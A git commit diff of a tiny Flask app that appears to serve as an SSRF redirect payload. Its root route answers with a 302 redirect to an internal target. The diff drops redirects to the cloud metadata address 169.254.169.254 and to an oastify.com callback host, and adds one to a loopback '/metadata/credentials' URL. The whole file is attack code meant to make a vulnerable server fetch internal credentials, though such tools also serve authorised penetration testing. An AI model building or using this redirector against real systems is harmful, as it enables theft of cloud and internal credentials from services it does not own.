9774d2d9d99e694ce6a70ae859fb6274d709fd59
nextgentech-labs <pyhacker39@gmail.com>
2026-06-20 11:22:03 +0530

    Update app.py

--- app.py
+++ app.py
@@ -5,12 +5,7 @@ app = Flask(__name__)
 @app.route('/')
 def index():
     # Step 1: First redirect to internal IP
-    return redirect('http://169.254.169.254/latest/meta-data', 302)
-
-@app.route('/step2')
-def step2():
-    # If they follow THIS, full chain confirmed
-    return redirect('http://1bd7khvodggb02gaydhcwzvu7ldc12pr.oastify.com', 302)
+    return redirect('http://[::1]:8888/metadata/credentials', 302)
     
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
